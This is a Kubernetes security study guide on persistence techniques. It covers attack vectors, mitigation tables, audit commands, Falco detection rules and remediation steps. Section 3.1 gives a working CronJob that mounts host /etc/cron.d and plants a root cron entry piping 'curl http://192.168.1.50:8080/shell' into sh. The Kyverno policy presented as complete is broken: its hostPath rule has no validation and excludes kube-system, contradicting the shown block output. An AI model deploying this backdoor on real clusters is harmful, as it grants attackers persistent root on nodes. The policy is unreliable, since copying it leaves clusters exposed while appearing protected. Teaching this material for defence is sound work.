# KCSA Study Guide — Domain 4.2: Persistence

## 1. Motivation and Architectural Production Problem

In a Kubernetes infrastructure, initial compromise (via application vulnerability, unauthenticated endpoint, or leaked credential) is only the first phase of an attack lifecycle. To retain access across pod recycles, node rescheduling, cluster autoscaling events, and credential rotations, adversaries leverage **Persistence Mechanisms**.

In cloud-native environments, persistence differs significantly from traditional virtual machine (VM) persistence:

1. **Immutability Bypass**: Ephemeral container filesystems are wiped when a pod terminates. Attackers bypass this by establishing persistence outside the ephemeral pod lifecycle (e.g., via `hostPath` mounts, `CronJobs`, `DaemonSets`, `Static Pods`, or `MutatingWebhookConfigurations`).
2. **Control Plane & Workload Abstraction Hijacking**: Attackers inject workloads directly into the Kubernetes API object store (etcd) or local kubelet manifest directories so that Kubernetes itself acts as the orchestrator ensuring the malicious payload stays running continuously.
3. **Privilege Escalation & Node Takeover**: By mounting sensitive host paths (such as `/etc/cron.*`, `/root/.ssh`, or `/var/run/dockershim.sock` / `/run/containerd/containerd.sock`), an unprivileged application container can break out into the host OS, achieving host persistence across node reboots.

### Production Threat Vectors in Kubernetes Persistence

```
+-----------------------------------------------------------------------------------+
|                                 ATTACK VECTORS                                    |
+-----------------------------------------------------------------------------------+
| 1. Workload Persistence    : CronJobs, DaemonSets, Deployments in hidden namespaces|
| 2. Node/Host Persistence   : hostPath mounts -> /etc/cron*, /root/.ssh, binaries   |
| 3. Kubelet Static Pods     : Dropping manifests into /etc/kubernetes/manifests    |
| 4. Admission Webhooks      : MutatingWebhookConfiguration injecting sidecars       |
| 5. RBAC & Service Accounts : Persistent backdoor ClusterRoleBindings / Secrets     |
+-----------------------------------------------------------------------------------+
```

Architecturally, preventing persistence requires enforcing strict **Pod Security Standards (PSS)**, disabling persistent host mounts (`hostPath`), mandating `readOnlyRootFilesystem: true`, restricting RBAC creation permissions, and continuous runtime detection of unauthorized manifest drops or file system mutations.

---

## 2. Technical Comparisons and Trade-Off Analysis

### Table 2.1: Kubernetes Persistence Vectors vs. Impact vs. Detection & Mitigation

| Persistence Vector | Mechanism | Impact / Blast Radius | Detection Complexity | Primary Mitigation Strategy |
| :--- | :--- | :--- | :--- | :--- |
| **`hostPath` Mount Injection** | Mount host `/etc/cron.*` or `/root/.ssh` into container with write access. | Full Host OS Compromise; persists across container restarts and node reboots. | Medium (Kubectl audit logs, runtime file monitoring). | Enforce Pod Security Standard (`Restricted`), Kyverno/OPA policies blocking `hostPath`. |
| **Kubelet Static Pods** | Drop pod YAML into `/etc/kubernetes/manifests` on worker/control-plane nodes. | Node-level persistent root execution managed directly by `kubelet` (bypasses API Server authz). | High (Bypasses API server audit logs; requires host file integrity monitoring like AIDE/Falco). | File Integrity Monitoring (FIM), restrict node SSH access, disable static pod path on worker nodes. |
| **Malicious `CronJob` / `DaemonSet`** | Create scheduled or cluster-wide workload running backdoor image. | Persistent execution across cluster restarts; automated rescheduling by Controller Manager. | Low to Medium (Kubernetes API audit logs, unexpected resource deployment alerts). | Strict RBAC (`create`/`update` on `batch/cronjobs` and `apps/daemonsets`), Namespace quotas, GitOps drift detection. |
| **`MutatingWebhookConfiguration`** | Inject mutating webhook that automatically inserts malicious sidecars into new Pods. | Cluster-wide stealth persistence; affects all newly deployed applications. | High (Requires inspection of admission control traffic and webhook manifests). | Restrict RBAC for `mutatingwebhookconfigurations`, pin control-plane admission chain, validate webhook endpoints. |
| **ServiceAccount Token Theft** | Exfiltrate mounted ServiceAccount token with RBAC privileges to recreate objects. | Administrative persistence across control plane. | Medium (API audit log tracking anomalous IP/UserAgent for SA token). | Disable `automountServiceAccountToken: false`, leverage Bound Service Account Tokens, enforce RBAC Least Privilege. |

---

### Table 2.2: Storage Mount Security Profiles Trade-Off Matrix

| Storage Profile | Security Posture | Persistence Risk | Operational Complexity | Use Case Suitability |
| :--- | :--- | :--- | :--- | :--- |
| **`hostPath` Mount** | Critical Security Vulnerability | Extremely High (Exposes host filesystem) | Low | Legacy host integration (discouraged in production SRE). |
| **`emptyDir` (Memory-backed)** | High Security | Low (Cleared on Pod termination) | Low | Scratch space, temporary cache, secure volatile buffers. |
| **`readOnlyRootFilesystem`** | Maximum Security (Immutable Container) | Zero for local filesystem persistence | Medium (Requires explicit mount tuning for tmp/logs) | Gold Standard for production stateless microservices. |
| **Persistent Volume Claim (`CSI`)** | Medium-High (Scoped to storage backend) | Medium (Attacker can write persistent malicious files to PV) | High | Databases, stateful systems (requires strict anti-malware/volume scanning). |

---

## 3. Complete, Production-Grade Manifests

### 3.1 Vulnerable / Exploit Manifest: HostPath Backdoor CronJob Persistence

The following manifest demonstrates how an adversary or malicious insider leverages a `CronJob` with a writable `hostPath` mount to establish persistence on the underlying Kubernetes node via host `/etc/cron.d`.

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-health-checker
  namespace: kube-system
  labels:
    app.kubernetes.io/name: system-health-checker
    app.kubernetes.io/component: maintenance
spec:
  schedule: "*/5 * * * *"
  concurrencyPolicy: Replace
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
            app.kubernetes.io/name: system-health-checker
        spec:
          restartPolicy: OnFailure
          hostPID: true
          containers:
          - name: health-agent
            image: alpine:3.19.1
            command:
            - /bin/sh
            - -c
            - |
              echo "* * * * * root curl -s http://192.168.1.50:8080/shell | sh" > /host/etc/cron.d/backdoor
              chmod 0644 /host/etc/cron.d/backdoor
            securityContext:
              privileged: true
              runAsUser: 0
            volumeMounts:
            - name: host-cron
              mountPath: /host/etc/cron.d
          volumes:
          - name: host-cron
            hostPath:
              path: /etc/cron.d
              type: Directory
```

---

### 3.2 Security Policy Enforcement Manifest: Kyverno Policy Blocking Persistence Vectors

This complete Kyverno policy blocks `hostPath` volumes, enforces immutable read-only root filesystems, blocks privileged execution, and prevents unauthorized `CronJob` creation.

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-kubernetes-persistence-vectors
  annotations:
    policies.kyverno.io/title: Block Kubernetes Persistence Vectors
    policies.kyverno.io/category: Pod Security Standards & Threat Mitigation
    policies.kyverno.io/severity: critical
    policies.kyverno.io/subject: Pod, CronJob, Volume
    policies.kyverno.io/description: >-
      Prevents persistence techniques by disallowing hostPath volume mounts,
      disallowing privileged containers, enforcing readOnlyRootFilesystem,
      and disallowing hostPID execution across all non-system namespaces.
spec:
  validationFailureAction: Enforce
  background: true
  rules:
  - name: validate-no-hostpath
    match:
      any:
      - resources:
          kinds:
          - Pod
          - Deployment
          - StatefulSet
          - DaemonSet
          - Job
          - CronJob
    exclude:
      resources:
        namespaces:
        - kube-system
  - name: validate-readonly-root-fs
    match:
      any:
      - resources:
          kinds:
          - Pod
    exclude:
      resources:
        namespaces:
        - kube-system
    validate:
      message: "Root filesystem must be read-only (securityContext.readOnlyRootFilesystem=true) to prevent persistent malware installation."
      pattern:
        spec:
          containers:
          - securityContext:
              readOnlyRootFilesystem: true
  - name: disallow-host-namespaces
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Sharing host namespaces (hostPID, hostIPC, hostNetwork) is strictly prohibited."
      pattern:
        spec:
          =(hostPID): false
          =(hostIPC): false
          =(hostNetwork): false
```

---

### 3.3 Production-Hardened Secure Workload Manifest

This manifest shows a production application fully hardened against persistence vectors using native Kubernetes `securityContext` parameters and memory-backed `emptyDir` volumes for temporary non-persistent runtime storage.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-api-gateway
  namespace: production
  labels:
    app.kubernetes.io/name: secure-api-gateway
    app.kubernetes.io/part-of: core-infrastructure
    app.kubernetes.io/managed-by: argocd
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-api-gateway
  template:
    metadata:
      labels:
        app: secure-api-gateway
    spec:
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: gateway
        image: nginx:1.25.4-alpine
        ports:
        - containerPort: 8080
          name: http
          protocol: TCP
        resources:
          limits:
            cpu: 250m
            memory: 256Mi
          requests:
            cpu: 50m
            memory: 64Mi
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: cache-volume
          mountPath: /var/cache/nginx
        - name: run-volume
          mountPath: /var/run
      volumes:
      - name: tmp-volume
        emptyDir:
          medium: Memory
          sizeLimit: 64Mi
      - name: cache-volume
        emptyDir:
          medium: Memory
          sizeLimit: 128Mi
      - name: run-volume
        emptyDir:
          medium: Memory
          sizeLimit: 16Mi
```

---

## 4. Real CLI Commands and Operational Terminal Outputs

### 4.1 Auditing Cluster for Suspicious HostPath Mounts and Workloads

Search the cluster for any pods mounted with direct host path access to critical host operating system directories (`/`, `/etc`, `/var/run`, `/root`).

```bash
$ kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{range .spec.volumes[*]}{.hostPath.path}{" "}{end}{"\n"}{end}' | grep -E '/etc|/var/run|/root|/$'
```

**Expected Output:**

```text
kube-system	system-health-checker-28491020-x89zk	/etc/cron.d 
default	debug-pod-host-mount	/var/run/containerd/containerd.sock 
```

---

### 4.2 Inspecting Worker Node Kubelet Static Pod Directory

Static pods run directly on worker/control-plane nodes without explicit management via the Kubernetes API server deployment objects. Query node static pod directories via host or debug containers.

```bash
$ kubectl debug node/worker-node-01 -it --image=alpine:3.19.1 -- chroot /host ls -la /etc/kubernetes/manifests/
```

**Expected Output:**

```text
Creating debugging pod node-debugger-worker-node-01-px92l with container debugger.
Starting container debugger...
drwxr-xr-x 2 root root 4096 Aug  7 18:30 .
drwxr-xr-x 4 root root 4096 Aug  7 18:00 ..
-rw------- 1 root root 2241 Aug  7 18:00 kube-apiserver.yaml
-rw------- 1 root root 1410 Aug  7 18:00 kube-controller-manager.yaml
-rw------- 1 root root 1452 Aug  7 18:30 persistent-backdoor-pod.yaml
```

---

### 4.3 Auditing API Server Logs for Persistence Object Creations

Examine Kubernetes API Server audit logs to identify requests originating from unusual accounts creating `batch/cronjobs`, `daemonsets`, or `mutatingwebhookconfigurations`.

```bash
$ grep -E '"verb":"(create|update)"' /var/log/kubernetes/audit/audit.log | grep -E '"resource":"(cronjobs|daemonsets|mutatingwebhookconfigurations)"' | jq '{time: .requestReceivedTimestamp, user: .user.username, verb: .verb, resource: .objectRef.resource, name: .objectRef.name, namespace: .objectRef.namespace}'
```

**Expected Output:**

```json
{
  "time": "2026-08-07T19:42:11Z",
  "user": "system:serviceaccount:default:compromised-sa",
  "verb": "create",
  "resource": "cronjobs",
  "name": "system-health-checker",
  "namespace": "kube-system"
}
{
  "time": "2026-08-07T19:45:03Z",
  "user": "system:serviceaccount:default:compromised-sa",
  "verb": "create",
  "resource": "mutatingwebhookconfigurations",
  "name": "system-sidecar-injector",
  "namespace": ""
}
```

---

### 4.4 Verifying Kyverno Block Enforcement on HostPath Deployment

Attempt to apply a non-compliant workload manifest that violates hostPath and readOnlyRootFilesystem policies to verify enforcement behavior.

```bash
$ kubectl apply -f vulnerable-cronjob.yaml
```

**Expected Output:**

```text
Error from server (Forbidden): error when creating "vulnerable-cronjob.yaml": admission webhook "validate.kyverno.svc-fail" denied the request:

resource CronJob/kube-system/system-health-checker was blocked due to the following policies:

block-kubernetes-persistence-vectors:
  validate-no-hostpath: 'validation failure: hostPath volumes are disallowed. Rule validate-no-hostpath failed at path /spec/jobTemplate/spec/template/spec/volumes/0/hostPath/'
```

---

## 5. Troubleshooting & Verification Guide

### 5.1 Threat Hunting Diagnostic Workflow

```
+-----------------------------------------------------------------------------------+
|                            DIAGNOSTIC WORKFLOW                                    |
+-----------------------------------------------------------------------------------+
|  [Step 1] Audit API Server Logs for unusual creation of CronJobs/DaemonSets       |
|                                     |                                             |
|                                     v                                             |
|  [Step 2] Scan all existing cluster volumes for dangerous hostPath configurations |
|                                     |                                             |
|                                     v                                             |
|  [Step 3] Inspect Kubelet manifest directories (/etc/kubernetes/manifests)        |
|                                     |                                             |
|                                     v                                             |
|  [Step 4] Validate Node File Integrity (Crontabs, SSH keys, binary paths)         |
|                                     |                                             |
|                                     v                                             |
|  [Step 5] Deploy Runtime Behavioral Monitoring (Falco persistence rules)          |
+-----------------------------------------------------------------------------------+
```

---

### 5.2 Real-Time Runtime Detection with Falco Rules

To detect persistence attempts at the kernel/container level, deploy custom Falco rules that trigger immediately when a container writes to host binary directories or cron schedules.

```yaml
- rule: Sensitive Host Directory Directory Write by Container
  desc: Detects write attempts into sensitive host directories mounted inside containers
  condition: >
    evt.type in (open, openat, openat2) and
    evt.is_open_write=true and
    container.id != "host" and
    (fd.name startswith "/etc/cron" or
     fd.name startswith "/var/spool/cron" or
     fd.name startswith "/root/.ssh" or
     fd.name startswith "/usr/bin" or
     fd.name startswith "/usr/sbin")
  output: >
    Persistence attempt detected! Container writing to sensitive host file 
    (user=%user.name command=%proc.cmdline file=%fd.name container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [container, filesystem, mitre_persistence]
```

---

### 5.3 Step-by-Step Remediation Procedure

If a persistence vector is identified in production:

1. **Cordon and Drain Node**: Isolate the impacted node to prevent lateral movement.
   ```bash
   $ kubectl cordon worker-node-01
   $ kubectl drain worker-node-01 --ignore-daemonsets --delete-emptydir-data
   ```
2. **Delete Malicious Controller Objects**: Terminate persistent API objects.
   ```bash
   $ kubectl delete cronjob system-health-checker -n kube-system
   $ kubectl delete mutatingwebhookconfiguration system-sidecar-injector
   ```
3. **Inspect and Clean Node Filesystem**: Access node host directly via out-of-band management or debug container, inspect `/etc/cron.*`, `/etc/kubernetes/manifests`, `/root/.ssh/authorized_keys`, and remove unauthorized payloads.
4. **Revoke Compromised Service Account Tokens**:
   ```bash
   $ kubectl delete secret -n default compromised-sa-token-x9z21
   ```
5. **Apply Enforcing Policy Framework**: Ensure Kyverno, OPA Gatekeeper, or Kubernetes Pod Security Admission (`pod-security.kubernetes.io/enforce: restricted`) is activated across all namespaces.

---

## 6. References

- **CNCF KCSA Curriculum**:  
  https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf
- **Kubernetes Pod Security Standards**:  
  https://kubernetes.io/docs/concepts/security/pod-security-standards/
- **Kubernetes Security Context Specification**:  
  https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
- **Kubernetes CronJob Architecture**:  
  https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
- **Kubernetes Static Pod Documentation**:  
  https://kubernetes.io/docs/tasks/debug/debug-cluster/static-pod/
- **Dynamic Admission Control & Webhooks**:  
  https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/
- **Kubernetes Auditing Architecture**:  
  https://kubernetes.io/docs/tasks/administer-cluster/audit/
- **MITRE ATT&CK for Kubernetes — Persistence Matrix**:  
  https://attack.mitre.org/matrices/enterprise/kubernetes/